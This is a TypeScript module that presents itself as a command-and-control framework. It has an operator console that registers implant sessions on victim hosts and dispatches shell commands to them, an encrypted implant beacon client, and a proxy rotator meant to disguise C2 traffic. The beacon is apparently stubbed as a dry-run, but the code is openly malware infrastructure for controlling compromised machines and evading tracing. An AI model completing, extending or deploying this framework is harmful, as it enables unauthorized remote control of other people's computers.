/**
 * @module c2
 * C2 (Command & Control) — operator console, agent client, and proxy rotation.
 * Provides the core framework for managing implant sessions.
 */

import * as net from "node:net";
import * as crypto from "node:crypto";
import * as https from "node:https";
import * as http from "node:http";
import { EventEmitter } from "node:events";

// ─── Types ────────────────────────────────────────────────────────────────────

export type AgentStatus = "active" | "idle" | "lost" | "dead";
export type Platform = "windows" | "linux" | "darwin" | "android" | "ios";

export interface Agent {
  id: string;
  hostname: string;
  username: string;
  platform: Platform;
  arch: string;
  pid: number;
  ip: string;
  checkinAt: Date;
  status: AgentStatus;
  tags: string[];
}

export interface TaskResult {
  taskId: string;
  agentId: string;
  output: string;
  exitCode: number;
  completedAt: Date;
}

export interface Task {
  id: string;
  agentId: string;
  command: string;
  createdAt: Date;
  timeout: number;
}

export interface ProxyConfig {
  host: string;
  port: number;
  type: "http" | "socks5";
  auth?: { username: string; password: string };
}

export interface C2Options {
  live?: boolean;
  listenHost?: string;
  listenPort?: number;
  encryptionKey?: string;
}

// ─── Proxy Rotation ───────────────────────────────────────────────────────────

/**
 * Rotate through a pool of proxies for each outbound C2 request.
 * Mimics the residential proxy rotation pattern.
 */
export class ProxyRotator {
  private proxies: ProxyConfig[];
  private index = 0;

  constructor(proxies: ProxyConfig[]) {
    this.proxies = proxies;
  }

  next(): ProxyConfig {
    const proxy = this.proxies[this.index];
    this.index = (this.index + 1) % this.proxies.length;
    return proxy;
  }

  random(): ProxyConfig {
    return this.proxies[Math.floor(Math.random() * this.proxies.length)];
  }

  add(proxy: ProxyConfig): void {
    this.proxies.push(proxy);
  }

  remove(host: string): void {
    this.proxies = this.proxies.filter((p) => p.host !== host);
  }

  get count(): number { return this.proxies.length; }
}

// ─── Agent Client ─────────────────────────────────────────────────────────────

/**
 * Client-side implant beacon — connects back to the C2 operator and fetches tasks.
 */
export class AgentClient extends EventEmitter {
  private agentId: string;
  private beaconInterval: number;
  private c2Url: string;
  private running = false;
  private timer?: ReturnType<typeof setInterval>;
  private encKey: Buffer;
  private proxy?: ProxyRotator;

  constructor(opts: {
    c2Url: string;
    beaconIntervalMs?: number;
    encryptionKey?: string;
    proxy?: ProxyRotator;
  }) {
    super();
    this.agentId = crypto.randomUUID();
    this.c2Url = opts.c2Url;
    this.beaconInterval = opts.beaconIntervalMs ?? 5000;
    this.encKey = crypto.scryptSync(opts.encryptionKey ?? "default", "salt", 32);
    this.proxy = opts.proxy;
  }

  /** Encrypt a payload before transmitting. */
  encrypt(data: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv("aes-256-gcm", this.encKey, iv);
    const enc = Buffer.concat([cipher.update(data, "utf8"), cipher.final()]);
    const tag = cipher.getAuthTag();
    return Buffer.concat([iv, tag, enc]).toString("base64");
  }

  /** Decrypt an incoming payload. */
  decrypt(b64: string): string {
    const buf = Buffer.from(b64, "base64");
    const iv = buf.subarray(0, 16);
    const tag = buf.subarray(16, 32);
    const enc = buf.subarray(32);
    const decipher = crypto.createDecipheriv("aes-256-gcm", this.encKey, iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(enc), decipher.final()]).toString("utf8");
  }

  /** Start the beacon loop. */
  start(): void {
    if (this.running) return;
    this.running = true;
    this.timer = setInterval(() => void this._beacon(), this.beaconInterval);
    this.emit("started", { agentId: this.agentId });
  }

  stop(): void {
    if (this.timer) clearInterval(this.timer);
    this.running = false;
    this.emit("stopped");
  }

  private async _beacon(): Promise<void> {
    const body = this.encrypt(JSON.stringify({
      id: this.agentId,
      hostname: "DRY-RUN",
      ts: Date.now(),
    }));
    this.emit("beacon", { agentId: this.agentId, body });
    // In dry-run: simulate a task response
    const fakeTask: Task = {
      id: crypto.randomUUID(),
      agentId: this.agentId,
      command: "whoami",
      createdAt: new Date(),
      timeout: 30,
    };
    this.emit("task", fakeTask);
  }
}

// ─── Operator Console ─────────────────────────────────────────────────────────

/**
 * Operator-side C2 server — manages agents and dispatches tasks.
 */
export class Operator extends EventEmitter {
  private agents = new Map<string, Agent>();
  private taskQueue = new Map<string, Task[]>();
  private results: TaskResult[] = [];
  private opts: C2Options;

  constructor(opts: C2Options = {}) {
    super();
    this.opts = opts;
  }

  /** Register a new agent check-in. */
  registerAgent(info: Omit<Agent, "id" | "checkinAt" | "status">): Agent {
    const agent: Agent = {
      ...info,
      id: crypto.randomUUID(),
      checkinAt: new Date(),
      status: "active",
    };
    this.agents.set(agent.id, agent);
    this.emit("agent:registered", agent);
    return agent;
  }

  /** Dispatch a shell command task to an agent. */
  dispatchTask(agentId: string, command: string, timeoutSec = 60): Task {
    const task: Task = {
      id: crypto.randomUUID(),
      agentId,
      command,
      createdAt: new Date(),
      timeout: timeoutSec,
    };
    const queue = this.taskQueue.get(agentId) ?? [];
    queue.push(task);
    this.taskQueue.set(agentId, queue);
    this.emit("task:dispatched", task);
    return task;
  }

  /** Pop the next pending task for an agent. */
  dequeueTask(agentId: string): Task | undefined {
    const queue = this.taskQueue.get(agentId) ?? [];
    return queue.shift();
  }

  /** Record a task result from an agent. */
  recordResult(result: TaskResult): void {
    this.results.push(result);
    const agent = this.agents.get(result.agentId);
    if (agent) {
      agent.checkinAt = result.completedAt;
      agent.status = "active";
    }
    this.emit("result", result);
  }

  /** Get all active agents. */
  getAgents(): Agent[] {
    return [...this.agents.values()];
  }

  /** Kill / terminate an agent session. */
  killAgent(agentId: string): void {
    const agent = this.agents.get(agentId);
    if (agent) {
      agent.status = "dead";
      this.emit("agent:killed", agent);
    }
  }

  getResults(): TaskResult[] { return [...this.results]; }
}

export default { AgentClient, Operator, ProxyRotator };
